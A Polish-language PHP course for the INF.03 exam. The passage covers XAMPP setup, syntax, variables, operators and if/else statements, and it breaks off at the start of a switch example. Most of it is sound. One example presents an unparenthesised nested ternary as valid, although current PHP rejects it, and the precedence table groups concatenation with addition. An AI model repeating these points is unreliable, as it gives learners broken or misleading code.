# **PHP - KOMPLEKSOWY KURS DLA UCZNIÓW INF.03**

---

## ⚠️ **UWAGA! WAŻNE DLA EGZAMINU INF.03**

### **Kolejność nauki vs kolejność na egzaminie**

Ten kurs jest ułożony **PEDAGOGICZNIE** - od podstaw do zaawansowanych zagadnień. To najlepsza kolejność dla **nauki**.

**ALE UWAGA!** Na prawdziwym egzaminie INF.03 kolejność zadań jest **INNA**:

| **Kolejność w NAUCE (ten kurs)** | **Kolejność na EGZAMINIE** |
|----------------------------------|----------------------------|
| 1. Podstawy PHP (zmienne, pętle, tablice) | 1. **BAZA DANYCH (SQL w phpMyAdmin)** |
| 2. Funkcje | 2. **STRONA WWW (HTML + CSS + PHP)** |
| 3. Formularze | 3. **GRAFIKA (GIMP)** |
| 4. Bazy danych MySQL | 4. **SKRYPTY PHP łączące z bazą** |

**Dlaczego taka różnica?**
- 📚 **W nauce:** Musisz najpierw poznać podstawy PHP, żeby rozumieć jak działa kod
- 🎯 **Na egzaminie:** Najpierw wykonujesz zadania SQL (nie potrzebujesz PHP!), potem łączysz PHP z gotową bazą

**Co to oznacza dla Ciebie?**
✅ Ucz się zgodnie z tym kursem (od początku do końca)  
✅ Przed egzaminem przejrzyj rozdział **"11b. PRZYKŁADOWE ZADANIE EGZAMINACYJNE"** - tam zobaczysz dokładnie jak wygląda egzamin  
✅ Pamiętaj: na egzaminie zaczniesz od SQL w phpMyAdmin, nie od PHP!

---

## **SPIS TREŚCI**

### 📚 PODSTAWY
1. [Wprowadzenie do PHP](#1-wprowadzenie-do-php)
2. [Podstawy składni PHP](#2-podstawy-składni-php)
3. [Zmienne i typy danych](#3-zmienne-i-typy-danych)
4. [Operatory - wykonywanie działań na danych](#4-operatory---wykonywanie-działań-na-danych)
5. [Instrukcje warunkowe - podejmowanie decyzji](#5-instrukcje-warunkowe---podejmowanie-decyzji)

### 🔄 PĘTLE I TABLICE
6. [Pętle - powtarzanie kodu](#6-pętle---powtarzanie-kodu)
7. [Tablice - przechowywanie wielu danych](#7-tablice---przechowywanie-wielu-danych)

### 🛠️ FUNKCJE I FORMULARZE
8. [Funkcje - organizacja kodu](#8-funkcje---organizacja-kodu)
9. [Formularze - komunikacja z użytkownikiem](#9-formularze---komunikacja-z-użytkownikiem)

### 📁 PLIKI I BAZY DANYCH
10. [Praca z plikami](#10-praca-z-plikami)
11. [Bazy danych MySQL - STYL PROCEDURALNY (EGZAMIN INF.03)](#11-bazy-danych-mysql)
    - 11a. Podstawy SQL i mysqli
    - 11b. [PRZYKŁADOWE ZADANIE EGZAMINACYJNE](#11b-przykładowe-zadanie-egzaminacyjne-inf03-jak-wygląda-prawdziwy-egzamin)

### 🔐 SESJE I BEZPIECZEŃSTWO
12. [Sesje i ciasteczka](#12-sesje-i-ciasteczka)
13. [Upload plików](#13-upload-plików)
14. [Bezpieczeństwo aplikacji](#14-bezpieczeństwo-aplikacji)
15. [Najczęstsze błędy i rozwiązywanie problemów](#15-najczęstsze-błędy-i-rozwiązywanie-problemów)

### 📝 MATERIAŁY EGZAMINACYJNE
- [Typowe zadania egzaminacyjne - rozwiązane](#typowe-zadania-egzaminacyjne---rozwiązane-krok-po-kroku)
- [Ściągawka przed egzaminem](#ściągawka---szybkie-powtórki-przed-egzaminem-inf03)
- [Przydatne linki i zasoby](#przydatne-linki-i-zasoby)

---

## **1. Wprowadzenie do PHP**

### **Czym jest PHP?**

PHP (PHP: Hypertext Preprocessor) to język skryptowy po stronie serwera, stworzony specjalnie do tworzenia dynamicznych stron internetowych. W przeciwieństwie do języków takich jak HTML czy CSS, które działają w przeglądarce użytkownika, **PHP wykonuje się na serwerze** webowym przed wysłaniem strony do przeglądarki.

#### **Dlaczego PHP jest popularny?**

| Zaleta | Opis |
|--------|------|
| ✅ **Łatwość nauki** | Składnia podobna do C, łatwa dla początkujących |
| ✅ **Darmowy** | Całkowicie bezpłatny i open-source |
| ✅ **Wszechstronny** | Od prostych stron po złożone aplikacje |
| ✅ **Duża społeczność** | Mnóstwo pomocy, tutoriali i gotowych rozwiązań |
| ✅ **Wsparcie baz danych** | Łatwa integracja z MySQL, PostgreSQL i innymi |
| ✅ **Hosting** | Dostępny na niemal każdym serwerze WWW |

### **Jak działa PHP? - Proces krok po kroku**

```
┌─────────────┐
│  Użytkownik │ 1. Wpisuje adres: localhost/strona.php
└──────┬──────┘
       │
       v
┌─────────────┐
│ Przeglądarka│ 2. Wysyła żądanie do serwera
└──────┬──────┘
       │
       v
┌─────────────┐
│   Serwer    │ 3. Serwer (Apache/Nginx) otrzymuje żądanie
│   Apache    │ 4. Przekazuje plik .php do interpretera PHP
└──────┬──────┘
       │
       v
┌─────────────┐
│     PHP     │ 5. PHP wykonuje kod
│ Interpreter │ 6. PHP łączy się z bazą danych (jeśli potrzeba)
└──────┬──────┘ 7. PHP generuje czysty HTML
       │
       v
┌─────────────┐
│   Serwer    │ 8. Zwraca gotowy HTML do przeglądarki
└──────┬──────┘
       │
       v
┌─────────────┐
│ Przeglądarka│ 9. Wyświetla stronę użytkownikowi
└─────────────┘
```

**WAŻNE:** Użytkownik nigdy nie widzi kodu PHP! Tylko gotowy HTML.

### **Instalacja środowiska - XAMPP**

Do nauki PHP potrzebujesz lokalnego serwera. Najpopularniejszym rozwiązaniem jest **XAMPP**, który zawiera:
- **Apache** - serwer WWW
- **PHP** - interpreter PHP
- **MySQL** - baza danych
- **phpMyAdmin** - narzędzie do zarządzania bazą danych

#### **Instrukcja instalacji krok po kroku:**

**Krok 1: Pobieranie**
1. Wejdź na stronę: https://www.apachefriends.org/
2. Pobierz wersję dla swojego systemu (Windows/Mac/Linux)
3. Uruchom instalator

**Krok 2: Instalacja**
1. Wybierz komponenty (zaznacz wszystko)
2. Wybierz folder instalacji (domyślnie: `C:\xampp`)
3. Zainstaluj program

**Krok 3: Uruchomienie**
1. Otwórz **XAMPP Control Panel**
2. Kliknij **"Start"** przy **Apache**
3. Kliknij **"Start"** przy **MySQL**
4. Jeśli przyciski zmienią kolor na zielony - działa!

**Krok 4: Test instalacji**
1. Otwórz przeglądarkę
2. Wpisz: `localhost` lub `127.0.0.1`
3. Powinieneś zobaczyć stronę powitalną XAMPP

#### **Gdzie zapisywać pliki PHP?**

Wszystkie pliki PHP musisz zapisać w folderze **`htdocs`**:

```
Windows: C:\xampp\htdocs\
Mac/Linux: /opt/lampp/htdocs/
```

**Przykład:**
- Plik: `C:\xampp\htdocs\test.php`
- Adres w przeglądarce: `localhost/test.php`

#### **Twój pierwszy plik PHP**

Stwórz plik `test.php` w folderze `htdocs`:

```php
<?php
    echo "Witaj w PHP!";
    echo "<h1>PHP działa poprawnie!</h1>";
    echo "Aktualna data: " . date("Y-m-d H:i:s");
?>
```

Otwórz w przeglądarce: `localhost/test.php`

**Jeśli widzisz tekst - gratulacje! PHP działa!**

### **Różnice między PHP a HTML**

| Cecha | HTML | PHP |
|-------|------|-----|
| **Gdzie się wykonuje?** | W przeglądarce (klient) | Na serwerze |
| **Co robi?** | Struktura strony | Generuje HTML, łączy z bazą |
| **Czy widać kod źródłowy?** | TAK (Ctrl+U) | NIE (tylko wynik) |
| **Czy może łączyć się z bazą?** | NIE | TAK |
| **Rozszerzenie pliku** | `.html` | `.php` |
| **Czy może zawierać HTML?** | - | TAK |

**Przykład - różnica w działaniu:**

**HTML** (`strona.html`):
```html
<h1>Witaj!</h1>
<p>Jest godzina: [tutaj nie możesz wstawić aktualnej godziny]</p>
```

**PHP** (`strona.php`):
```php
<h1>Witaj!</h1>
<p>Jest godzina: <?php echo date("H:i:s"); ?></p>
```

---

## **2. Podstawy składni PHP**

### **Znaczniki PHP - jak PHP wie gdzie jest kod?**

PHP musi być wyraźnie oznaczony w pliku. Używamy do tego **znaczników**.

#### **Podstawowy znacznik (ZAWSZE używaj tego!)**

```php
<?php
    // Tutaj piszesz kod PHP
    echo "Hello World!";
?>
```

- `<?php` - rozpoczyna blok kodu PHP
- `?>` - kończy blok kodu PHP (opcjonalne na końcu pliku)

#### **Przykład z HTML**

```php
<!DOCTYPE html>
<html>
<head>
    <title>Moja strona</title>
</head>
<body>
    <h1>Witaj na stronie!</h1>
    
    <?php
        echo "<p>To jest tekst wygenerowany przez PHP</p>";
        echo "<p>Dzisiaj jest: " . date("Y-m-d") . "</p>";
    ?>
    
    <footer>Stopka strony</footer>
</body>
</html>
```

### **Wyświetlanie tekstu - echo i print**

W PHP mamy dwa główne sposoby na wyświetlanie tekstu:

#### **1. echo (najczęściej używany)**

```php
<?php
    echo "Prosty tekst";
    echo "Linia 1";
    echo "Linia 2";
    
    // Można wyświetlać wiele rzeczy naraz
    echo "Tekst ", "kolejny tekst ", "i jeszcze jeden";
    
    // echo bez nawiasów (krócej)
    echo "Hello";
?>
```

#### **2. print (alternatywa)**

```php
<?php
    print "Hello World";
    print("Hello World");  // Z nawiasami też działa
?>
```

**Różnica między echo i print:**

| Cecha | echo | print |
|-------|------|-------|
| Szybkość | Trochę szybszy | Trochę wolniejszy |
| Zwraca wartość | NIE | TAK (zawsze 1) |
| Wiele argumentów | TAK | NIE |
| Popularność | Bardziej popularny | Mniej popularny |

**Najlepsza praktyka:** Używaj `echo` - jest szybszy i bardziej popularny.

### **Średnik - BARDZO WAŻNE!**

**Każda instrukcja w PHP MUSI kończyć się średnikiem `;`**

```php
<?php
    echo "Linia 1";  // Średnik!
    echo "Linia 2";  // Średnik!
    
    $zmienna = 10;   // Średnik!
?>
```

**BEZ średnika - BŁĄD:**
```php
<?php
    echo "Linia 1"   // ❌ BŁĄD! Brak średnika
    echo "Linia 2"   // ❌ BŁĄD! Brak średnika
?>
```

### **Komentarze - notatki w kodzie**

Komentarze to tekst, który PHP **ignoruje**. Służą do wyjaśniania kodu.

#### **Komentarz jednolinijkowy**

```php
<?php
    // To jest komentarz - PHP to pominie
    echo "Ten kod się wykona";
    
    # To też jest komentarz (styl Unix)
    
    echo "Hello"; // Komentarz może być na końcu linii
?>
```

#### **Komentarz wielolinijkowy**

```php
<?php
    /*
       To jest dłuższy komentarz
       który zajmuje wiele linii.
       Przydatne do opisywania
       skomplikowanych fragmentów kodu.
    */
    echo "Ten kod się wykona";
?>
```

#### **Kiedy używać komentarzy?**

✅ **Używaj gdy:**
- Wyjaśniasz skomplikowany fragment kodu
- Opisujesz funkcję i jej parametry
- Zostawiasz notatki dla siebie na przyszłość
- Chcesz tymczasowo wyłączyć kod (zamiast usuwać)

❌ **NIE używaj gdy:**
- Kod jest oczywisty (np. `$suma = $a + $b; // dodawanie` - zbędne)
- Komentarz tylko powtarza to co robi kod

**Przykłady dobrych komentarzy:**

```php
<?php
    // Obliczenie rabatu 20% dla stałych klientów
    $cenaPoRabacie = $cena * 0.8;
    
    // TODO: Dodać walidację email przed zapisem
    
    // UWAGA: Ta funkcja wymaga PHP 7.4+
    
    /*
       Funkcja obliczająca cenę brutto
       Parametry:
       - $netto: cena netto (float)
       - $vat: stawka VAT w procentach (int, domyślnie 23)
       Zwraca: cenę brutto (float)
    */
?>
```

### **Wielkość liter w PHP**

#### **PHP jest CZĘŚCIOWO wrażliwe na wielkość liter:**

```php
<?php
    // Funkcje i konstrukcje językowe - wielkość liter NIE ma znaczenia
    ECHO "test";   // ✅ Działa
    Echo "test";   // ✅ Działa
    echo "test";   // ✅ Działa
    
    IF (true) { }  // ✅ Działa
    if (true) { }  // ✅ Działa
    
    // Zmienne - wielkość liter MA znaczenie!
    $imie = "Jan";
    $Imie = "Anna";
    $IMIE = "Piotr";
    // To są TRZY RÓŻNE zmienne!
    
    echo $imie;  // Jan
    echo $Imie;  // Anna
    echo $IMIE;  // Piotr
?>
```

**Najlepsza praktyka:**
- Funkcje i słowa kluczowe pisz małymi literami: `echo`, `if`, `while`
- Nazwy zmiennych: camelCase (`$mojaNazwa`) lub snake_case (`$moja_nazwa`)

---

## **3. Zmienne i typy danych**

### **Co to jest zmienna?**

Zmienna to **pojemnik na dane** z nadaną nazwą. Możesz w niej przechowywać różne wartości i je zmieniać.

**Analogia:** Zmienna jest jak pudełko z etykietą:
- **Etykieta** = nazwa zmiennej (np. `$wiek`)
- **Zawartość pudełka** = wartość (np. `25`)
- Możesz zmieniać zawartość pudełka w dowolnym momencie

### **Tworzenie zmiennych - składnia**

```php
<?php
    $nazwaZmiennej = wartość;
?>
```

**WAŻNE zasady:**
1. ✅ Zmienna ZAWSZE zaczyna się od `$`
2. ✅ Po `$` musi być litera lub `_`
3. ✅ Może zawierać litery, cyfry, `_`
4. ✅ Wielkość liter MA ZNACZENIE
5. ❌ NIE może zaczynać się od cyfry
6. ❌ NIE może zawierać spacji

#### **Przykłady poprawnych nazw:**

```php
<?php
    $imie = "Jan";             // ✅
    $wiek = 25;                // ✅
    $cenaProduktu = 19.99;     // ✅
    $cena_produktu = 19.99;    // ✅
    $_test = "test";           // ✅
    $test2 = "test";           // ✅
?>
```

#### **Przykłady NIEPOPRAWNYCH nazw:**

```php
<?php
    $2test = "test";         // ❌ Zaczyna się od cyfry
    $cena produktu = 19.99;  // ❌ Zawiera spację
    $cena-produktu = 19.99;  // ❌ Zawiera znak -
    imie = "Jan";            // ❌ Brak $ na początku
?>
```

### **Typy danych w PHP**

PHP automatycznie rozpoznaje typ danych. To nazywa się **dynamiczne typowanie**.

#### **1. STRING (tekst)**

Tekst w cudzysłowach (pojedynczych lub podwójnych):

```php
<?php
    $imie = "Jan";
    $nazwisko = 'Kowalski';
    $adres = "ul. Kwiatowa 15";
    
    // Różnica między " " a ' '
    $wiek = 25;
    echo "Mam $wiek lat";    // Wyświetli: Mam 25 lat (zmienna interpretowana)
    echo 'Mam $wiek lat';    // Wyświetli: Mam $wiek lat (zmienna NIE interpretowana)
?>
```

**Zasada:**
- `"` (podwójny cudzysłów) - interpretuje zmienne
- `'` (pojedynczy cudzysłów) - NIE interpretuje zmiennych

#### **2. INTEGER (liczba całkowita)**

Liczby bez części dziesiętnej:

```php
<?php
    $wiek = 25;
    $ilosc = 100;
    $ujemna = -50;
    $zero = 0;
?>
```

#### **3. FLOAT (liczba dziesiętna)**

Liczby z częścią dziesiętną:

```php
<?php
    $cena = 19.99;
    $wzrost = 175.5;
    $pi = 3.14159;
    $ujemna = -12.5;
?>
```

**UWAGA:** W PHP używamy **kropki**, nie przecinka!
- ✅ `$cena = 19.99;`
- ❌ `$cena = 19,99;`

#### **4. BOOLEAN (prawda/fałsz)**

Tylko dwie wartości: `true` lub `false`:

```php
<?php
    $czyZalogowany = true;
    $czyAdmin = false;
    
    // Użycie w warunkach
    if ($czyZalogowany) {
        echo "Witaj!";
    }
?>
```

#### **5. NULL (brak wartości)**

Oznacza, że zmienna nie ma wartości:

```php
<?php
    $pusty = null;
    
    // Sprawdzanie czy zmienna jest null
    if ($pusty === null) {
        echo "Zmienna jest pusta";
    }
?>
```

#### **6. ARRAY (tablica)**

Przechowuje wiele wartości (omówione szczegółowo w rozdziale 7):

```php
<?php
    $owoce = ["jabłko", "banan", "gruszka"];
    $osoba = ["imie" => "Jan", "wiek" => 25];
?>
```

### **Sprawdzanie typu zmiennej**

```php
<?php
    $zmienna = "test";
    
    echo gettype($zmienna);     // string
    var_dump($zmienna);         // string(4) "test"
    
    // Sprawdzanie konkretnego typu
    is_string($zmienna);        // true
    is_int($zmienna);           // false
    is_float($zmienna);         // false
    is_bool($zmienna);          // false
    is_array($zmienna);         // false
    is_null($zmienna);          // false
?>
```

### **Wyświetlanie zmiennych**

```php
<?php
    $imie = "Anna";
    $wiek = 20;
    $wzrost = 165.5;
    
    // Sposób 1: echo bezpośrednio
    echo $imie;
    
    // Sposób 2: w cudzysłowie podwójnym
    echo "Mam na imię $imie";
    
    // Sposób 3: łączenie kropką
    echo "Mam na imię " . $imie . " i mam " . $wiek . " lat";
    
    // Sposób 4: w nawiasach klamrowych (gdy nazwa zmiennej się skleja)
    echo "Test{$imie}123";
    
    // UWAGA: W pojedynczym cudzysłowie NIE działa
    echo 'Mam na imię $imie';  // Wyświetli: Mam na imię $imie
?>
```

### **Konkatenacja (łączenie tekstów)**

```php
<?php
    $imie = "Jan";
    $nazwisko = "Kowalski";
    
    // Łączenie kropką
    $pelneImie = $imie . " " . $nazwisko;
    echo $pelneImie;  // Jan Kowalski
    
    // Łączenie z przypisaniem
    $tekst = "Hello";
    $tekst .= " World";  // $tekst = $tekst . " World"
    echo $tekst;  // Hello World
?>
```

### **Konwersja typów**

PHP automatycznie konwertuje typy, ale możesz to robić ręcznie:

```php
<?php
    // Automatyczna konwersja
    $liczba = "10";  // String
    $suma = $liczba + 5;  // PHP zamieni "10" na 10
    echo $suma;  // 15
    
    // Ręczna konwersja (casting)
    $tekst = "123";
    $liczba = (int)$tekst;      // String → Integer
    $zmiennoprzecinkowa = (float)"19.99";  // String → Float
    $bool = (bool)1;            // Integer → Boolean (1 = true, 0 = false)
    $string = (string)123;      // Integer → String
    
    // Funkcje konwertujące
    $int = intval("123");       // String → Integer
    $float = floatval("19.99"); // String → Float
    $str = strval(123);         // Integer → String
?>
```

### **Stałe - wartości niezmienne**

Stała to wartość, która **NIE MOŻE** się zmienić po zdefiniowaniu:

```php
<?php
    // Definiowanie stałej
    define("STAWKA_VAT", 0.23);
    define("NAZWA_FIRMY", "Moja Firma Sp. z o.o.");
    define("MAX_ROZMIAR_PLIKU", 5242880); // 5MB w bajtach
    
    // Użycie
    echo STAWKA_VAT;        // 0.23
    echo NAZWA_FIRMY;       // Moja Firma Sp. z o.o.
    
    // Nie można zmienić wartości!
    STAWKA_VAT = 0.25;  // ❌ BŁĄD!
?>
```

**Różnice między zmienną a stałą:**

| Cecha | Zmienna | Stała |
|-------|---------|-------|
| Znak na początku | `$` | Brak |
| Można zmienić wartość? | TAK | NIE |
| Konwencja nazewnictwa | camelCase | WIELKIE_LITERY |
| Zakres | Lokalny/globalny | Zawsze globalny |
| Przykład | `$cenaProductu` | `STAWKA_VAT` |

### **Zmienne predefiniowane (superglobalne)**

PHP ma wbudowane specjalne zmienne, dostępne wszędzie:

```php
<?php
    $_GET       // Dane z formularza metodą GET
    $_POST      // Dane z formularza metodą POST
    $_SERVER    // Informacje o serwerze
    $_SESSION   // Dane sesji
    $_COOKIE    // Ciasteczka
    $_FILES     // Przesłane pliki
    
    // Przykłady użycia:
    echo $_SERVER["PHP_SELF"];          // Nazwa aktualnego skryptu
    echo $_SERVER["SERVER_NAME"];       // Nazwa serwera
    echo $_SERVER["REQUEST_METHOD"];    // POST, GET, etc.
    echo $_SERVER["REMOTE_ADDR"];       // IP użytkownika
?>
```

### **Zakres zmiennych (scope)**

```php
<?php
    $globalnaZmienna = "Jestem globalną";
    
    function testZmiennej() {
        $lokalnaZmienna = "Jestem lokalną";
        
        echo $lokalnaZmienna;       // ✅ Działa
        echo $globalnaZmienna;      // ❌ NIE działa (zmienna globalna niedostępna)
        
        // Aby użyć zmiennej globalnej w funkcji:
        global $globalnaZmienna;
        echo $globalnaZmienna;      // ✅ Teraz działa
    }
    
    echo $lokalnaZmienna;  // ❌ NIE działa (zmienna lokalna niedostępna poza funkcją)
?>
```

---

## **4. Operatory - wykonywanie działań na danych**

### **Operatory arytmetyczne (matematyka)**

Służą do wykonywania obliczeń matematycznych:

```php
<?php
    $a = 10;
    $b = 3;
    
    echo $a + $b;   // Dodawanie: 13
    echo $a - $b;   // Odejmowanie: 7
    echo $a * $b;   // Mnożenie: 30
    echo $a / $b;   // Dzielenie: 3.333...
    echo $a % $b;   // Modulo (reszta z dzielenia): 1
    echo $a ** $b;  // Potęgowanie: 1000 (10³)
?>
```

#### **Modulo - szczegółowe wyjaśnienie**

Operator `%` zwraca resztę z dzielenia:

```php
<?php
    echo 10 % 3;  // 1 (10 ÷ 3 = 3 reszty 1)
    echo 15 % 4;  // 3 (15 ÷ 4 = 3 reszty 3)
    echo 20 % 5;  // 0 (20 ÷ 5 = 4 reszty 0)
    
    // Praktyczne zastosowanie - sprawdzanie parzystości
    $liczba = 7;
    if ($liczba % 2 == 0) {
        echo "Liczba parzysta";
    } else {
        echo "Liczba nieparzysta";
    }
?>
```

#### **Kolejność wykonywania działań**

PHP przestrzega matematycznej kolejności działań:

```php
<?php
    echo 2 + 3 * 4;       // 14 (najpierw mnożenie, potem dodawanie)
    echo (2 + 3) * 4;     // 20 (nawiasy mają najwyższy priorytet)
    
    // Priorytet operatorów (od najwyższego):
    // 1. ()           - nawiasy
    // 2. **           - potęgowanie
    // 3. *, /, %      - mnożenie, dzielenie, modulo
    // 4. +, -         - dodawanie, odejmowanie
?>
```

### **Operatory przypisania**

#### **Podstawowe przypisanie**

```php
<?php
    $x = 10;  // Przypisz wartość 10 do zmiennej $x
?>
```

#### **Operatory skrócone**

```php
<?php
    $x = 10;
    
    $x += 5;   // $x = $x + 5   →  15
    $x -= 3;   // $x = $x - 3   →  12
    $x *= 2;   // $x = $x * 2   →  24
    $x /= 4;   // $x = $x / 4   →  6
    $x %= 4;   // $x = $x % 4   →  2
    
    // Dla stringów
    $tekst = "Hello";
    $tekst .= " World";  // $tekst = $tekst . " World"  →  "Hello World"
?>
```

#### **Inkrementacja i dekrementacja**

```php
<?php
    $licznik = 5;
    
    // Inkrementacja (zwiększanie o 1)
    $licznik++;    // $licznik = 6  (post-inkrementacja)
    ++$licznik;    // $licznik = 7  (pre-inkrementacja)
    
    // Dekrementacja (zmniejszanie o 1)
    $licznik--;    // $licznik = 6  (post-dekrementacja)
    --$licznik;    // $licznik = 5  (pre-dekrementacja)
    
    // Różnica między pre i post:
    $a = 5;
    $b = $a++;  // $b = 5, $a = 6 (najpierw przypisanie, potem zwiększenie)
    
    $a = 5;
    $b = ++$a;  // $b = 6, $a = 6 (najpierw zwiększenie, potem przypisanie)
?>
```

### **Operatory porównania**

Porównują dwie wartości i zwracają `true` lub `false`:

```php
<?php
    $a = 10;
    $b = "10";
    $c = 5;
    
    // Równość (sprawdza tylko wartość)
    var_dump($a == $b);    // true (10 == "10")
    
    // Identyczność (sprawdza wartość I typ)
    var_dump($a === $b);   // false (int !== string)
    
    // Nierówność
    var_dump($a != $c);    // true
    var_dump($a <> $c);    // true (alternatywna składnia)
    
    // Nieidentyczność
    var_dump($a !== $b);   // true
    
    // Większy, mniejszy
    var_dump($a > $c);     // true (10 > 5)
    var_dump($a < $c);     // false (10 < 5)
    
    // Większy lub równy, mniejszy lub równy
    var_dump($a >= 10);    // true
    var_dump($a <= 9);     // false
?>
```

#### **Tabela porównań - == vs ===**

| Porównanie | `==` (równość) | `===` (identyczność) |
|------------|----------------|----------------------|
| `5 == 5` | TRUE | TRUE |
| `5 == "5"` | TRUE | FALSE (różne typy) |
| `0 == false` | TRUE | FALSE (różne typy) |
| `"" == false` | TRUE | FALSE (różne typy) |
| `null == false` | TRUE | FALSE (różne typy) |

**Najlepsza praktyka:** Używaj `===` zamiast `==` (jest bezpieczniejszy)!

### **Operatory logiczne**

Łączą warunki logiczne:

```php
<?php
    $wiek = 20;
    $maKonto = true;
    $jestAktywny = true;
    
    // AND (&&) - oba warunki muszą być prawdziwe
    if ($wiek >= 18 && $maKonto) {
        echo "Może kupować";  // Wykona się, bo oba warunki to true
    }
    
    // OR (||) - wystarczy jeden warunek prawdziwy
    if ($wiek < 18 || !$maKonto) {
        echo "Nie może kupować";
    }
    
    // NOT (!) - odwraca wartość
    if (!$jestAktywny) {
        echo "Konto nieaktywne";
    }
    
    // AND - alternatywna składnia
    if ($wiek >= 18 and $maKonto) {
        echo "Może kupować";
    }
    
    // OR - alternatywna składnia
    if ($wiek < 18 or !$maKonto) {
        echo "Nie może kupować";
    }
?>
```

#### **Tabela logiczna dla AND (&&)**

| A | B | A && B |
|---|---|--------|
| true | true | TRUE |
| true | false | FALSE |
| false | true | FALSE |
| false | false | FALSE |

#### **Tabela logiczna dla OR (||)**

| A | B | A \|\| B |
|---|---|----------|
| true | true | TRUE |
| true | false | TRUE |
| false | true | TRUE |
| false | false | FALSE |

#### **Tabela logiczna dla NOT (!)**

| A | !A |
|---|-----|
| true | FALSE |
| false | TRUE |

### **Operator trójargumentowy (ternary)**

Skrócona wersja `if-else`:

```php
<?php
    // Składnia: (warunek) ? wartość_gdy_true : wartość_gdy_false
    
    $wiek = 20;
    $status = ($wiek >= 18) ? "Pełnoletni" : "Niepełnoletni";
    echo $status;  // Pełnoletni
    
    // To samo co:
    if ($wiek >= 18) {
        $status = "Pełnoletni";
    } else {
        $status = "Niepełnoletni";
    }
    
    // Więcej przykładów:
    $punkty = 75;
    $ocena = ($punkty >= 50) ? "Zaliczony" : "Niezaliczony";
    
    $cena = 100;
    $rabat = ($cena > 50) ? 10 : 5;  // Rabat 10 zł jeśli cena > 50, inaczej 5 zł
?>
```

### **Operator złączenia null (??) - PHP 7+**

Zwraca pierwszą wartość, która nie jest `null`:

```php
<?php
    // Bez operatora ??
    $uzytkownik = isset($_GET["user"]) ? $_GET["user"] : "Gość";
    
    // Z operatorem ?? (krócej i czytelniej)
    $uzytkownik = $_GET["user"] ?? "Gość";
    
    // Łańcuchowanie
    $wartosc = $opcja1 ?? $opcja2 ?? $opcja3 ?? "domyślna";
    
    // Przykład praktyczny
    $imie = $_POST["imie"] ?? "Nieznany";
    echo "Witaj, $imie!";
?>
```

### **Operatory stringowe (tekstowe)**

```php
<?php
    // Konkatenacja (łączenie) - operator .
    $imie = "Jan";
    $nazwisko = "Kowalski";
    $pelneImie = $imie . " " . $nazwisko;  // Jan Kowalski
    
    // Konkatenacja z przypisaniem - operator .=
    $tekst = "Hello";
    $tekst .= " World";  // Hello World
    $tekst .= "!";       // Hello World!
?>
```

### **Priorytet operatorów (od najwyższego)**

| Priorytet | Operatory | Opis |
|-----------|-----------|------|
| 1 | `()` | Nawiasy |
| 2 | `**` | Potęgowanie |
| 3 | `++`, `--`, `!` | Inkrementacja, dekrementacja, negacja |
| 4 | `*`, `/`, `%` | Mnożenie, dzielenie, modulo |
| 5 | `+`, `-`, `.` | Dodawanie, odejmowanie, konkatenacja |
| 6 | `<`, `<=`, `>`, `>=` | Porównania |
| 7 | `==`, `!=`, `===`, `!==` | Równość, identyczność |
| 8 | `&&` | AND logiczne |
| 9 | `\|\|` | OR logiczne |
| 10 | `=`, `+=`, `-=`, itd. | Przypisanie |

---

## **5. Instrukcje warunkowe - podejmowanie decyzji**

Instrukcje warunkowe pozwalają wykonywać różny kod w zależności od spełnienia warunków.

### **Instrukcja IF - podstawowa**

Wykonuje kod tylko gdy warunek jest prawdziwy:

```php
<?php
    $wiek = 20;
    
    if ($wiek >= 18) {
        echo "Jesteś pełnoletni";
        echo "Możesz głosować";
    }
?>
```

**Schemat działania:**
```
JEŚLI warunek jest prawdziwy
    TO wykonaj ten kod
KONIEC
```

### **Instrukcja IF-ELSE**

Wykonuje jeden kod gdy warunek prawdziwy, inny gdy fałszywy:

```php
<?php
    $wiek = 15;
    
    if ($wiek >= 18) {
        echo "Jesteś pełnoletni";
        echo "Możesz wejść";
    } else {
        echo "Jesteś niepełnoletni";
        echo "Nie możesz wejść";
    }
?>
```

**Schemat działania:**
```
JEŚLI warunek jest prawdziwy
    TO wykonaj kod A
W PRZECIWNYM RAZIE
    wykonaj kod B
KONIEC
```

### **Instrukcja IF-ELSEIF-ELSE**

Sprawdza wiele warunków po kolei:

```php
<?php
    $ocena = 4;
    
    if ($ocena == 6) {
        echo "Celujący! Wspaniale!";
    } elseif ($ocena == 5) {
        echo "Bardzo dobry! Świetna robota!";
    } elseif ($ocena == 4) {
        echo "Dobry! Niezła robota!";
    } elseif ($ocena == 3) {
        echo "Dostateczny. Można lepiej!";
    } elseif ($ocena == 2) {
        echo "Dopuszczający. Musisz popracować!";
    } else {
        echo "Niedostateczny. Trzeba się douczyć!";
    }
?>
```

#### **Przykład praktyczny - kalkulator rabatu**

```php
<?php
    $kwotaZakupow = 250;
    $rabat = 0;
    
    if ($kwotaZakupow >= 500) {
        $rabat = 20;  // 20% rabatu dla zakupów powyżej 500 zł
    } elseif ($kwotaZakupow >= 200) {
        $rabat = 10;  // 10% rabatu dla zakupów powyżej 200 zł
    } elseif ($kwotaZakupow >= 100) {
        $rabat = 5;   // 5% rabatu dla zakupów powyżej 100 zł
    }
    
    $kwotaPoRabacie = $kwotaZakupow * (1 - $rabat / 100);
    echo "Kwota: $kwotaZakupow zł<br>";
    echo "Rabat: $rabat%<br>";
    echo "Do zapłaty: $kwotaPoRabacie zł";
?>
```

### **Zagnieżdżone warunki**

Warunki w warunkach:

```php
<?php
    $wiek = 20;
    $maKonto = true;
    $weryfikacja = true;
    
    if ($wiek >= 18) {
        if ($maKonto) {
            if ($weryfikacja) {
                echo "Możesz kupić";
            } else {
                echo "Konto niezweryfikowane";
            }
        } else {
            echo "Musisz założyć konto";
        }
    } else {
        echo "Jesteś za młody";
    }
    
    // Lepszy sposób - łączenie warunków operatorami logicznymi:
    if ($wiek >= 18 && $maKonto && $weryfikacja) {
        echo "Możesz kupić";
    }
?>
```

### **Operator trójargumentowy (ternary) - skrócony IF**

```php
<?php
    $wiek = 20;
    
    // Normalny if-else
    if ($wiek >= 18) {
        $status = "Pełnoletni";
    } else {
        $status = "Niepełnoletni";
    }
    
    // Operator trójargumentowy (to samo krócej)
    $status = ($wiek >= 18) ? "Pełnoletni" : "Niepełnoletni";
    
    // Więcej przykładów:
    $punkty = 75;
    $wynik = ($punkty >= 50) ? "Zaliczony" : "Niezaliczony";
    
    $temperatura = 25;
    $pogoda = ($temperatura > 20) ? "Ciepło" : "Zimno";
    
    // Można zagnieżdżać (ale lepiej unikać - mało czytelne)
    $ocena = ($punkty >= 90) ? "A" : ($punkty >= 75) ? "B" : "C";
?>
```

### **Instrukcja SWITCH - wiele konkretnych wartości**

Używana gdy sprawdzamy jedną zmienną na wiele konkretnych wartości:

```php
<?php
